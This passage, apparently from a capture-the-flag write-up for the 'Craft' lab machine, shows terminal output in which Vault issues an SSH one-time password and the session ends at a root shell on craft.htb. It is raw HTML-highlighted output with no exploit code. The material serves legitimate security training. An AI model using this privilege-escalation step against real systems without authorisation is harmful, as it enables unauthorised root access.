below. Enter this code <span class="k">in </span>the SSH password prompt. If you <span class="nb">install </span>sshpass,
Vault can automatically perform this step <span class="k">for </span>you.
OTP <span class="k">for </span>the session is: 79c5ebe7-8c2b-b4cc-7962-3186e0420c4e


  <span class="nb">.</span>   <span class="k">*</span>   ..  <span class="nb">.</span> <span class="k">*</span>  <span class="k">*</span>
<span class="k">*</span>  <span class="k">*</span> @<span class="o">()</span>Ooc<span class="o">()</span><span class="k">*</span>   o  <span class="nb">.</span>
    <span class="o">(</span>Q@<span class="k">*</span>0CG<span class="k">*</span>O<span class="o">()</span>  ___
   |<span class="se">\_</span>________/|/ _ <span class="se">\</span>
   |  |  |  |  | / | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | | | |
   |  |  |  |  | <span class="se">\_</span>| |
   |  |  |  |  |<span class="se">\_</span>__/
   |<span class="se">\_</span>|__|__|_/|
    <span class="se">\_</span>________/



Password:
Linux craft.htb 4.9.0-8-amd64 <span class="c">#1 SMP Debian 4.9.130-2 (2018-10-27) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 12 12:58:41 2021 from ::1
root@craft:~#
</pre></td></tr></tbody></table></code></pre></div></div>
:ET